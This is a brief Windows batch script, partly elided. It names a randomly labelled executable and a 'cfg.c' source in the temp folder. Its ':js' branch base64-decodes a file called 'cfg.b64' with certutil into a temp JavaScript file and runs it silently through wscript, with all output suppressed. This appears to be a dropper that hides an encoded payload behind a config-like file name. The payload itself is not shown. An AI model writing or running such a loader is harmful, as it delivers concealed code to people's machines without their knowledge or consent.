@echo off
setlocal
set "OUT=%TEMP%\rbc_403df8b1c5e75f5c.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_403df8b1c5e75f5c.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_403df8b1c5e75f5c.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_403df8b1c5e75f5c.js"
exit /b 0
